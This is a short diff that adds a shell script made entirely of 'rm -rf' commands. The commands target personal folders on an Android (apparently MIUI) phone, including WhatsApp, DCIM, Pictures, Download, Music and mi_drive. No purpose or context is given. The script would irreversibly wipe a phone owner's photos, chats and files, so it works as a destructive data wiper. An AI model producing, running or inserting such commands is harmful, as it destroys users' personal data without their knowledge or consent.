@@ -1,0 +1,14 @@
+rm -rf storage
+rm -rf WhatsApp
+rm -rf Android
+rm -rf DCIM
+rm -rf Download
+rm -rf MIUI
+rm -rf MiVideoGlobal
+rm -rf Movies
+rm -rf Music
+rm -rf Notifications
+rm -rf Pictures
+rm -rf Podcasts
+rm -rf Ringtones
+rm -rf mi_drive
